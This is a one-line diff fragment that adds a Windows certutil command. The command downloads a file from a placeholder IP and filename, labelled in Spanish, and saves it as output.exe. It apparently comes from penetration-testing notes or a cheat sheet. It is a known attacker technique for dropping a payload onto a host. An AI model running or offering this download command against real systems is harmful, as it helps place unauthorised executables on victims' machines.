@@ -1,0 +1,1 @@
+certutil -urlcache -f http://[*IP*]:80/[*ARCHIVO*] [Salida: output.exe]
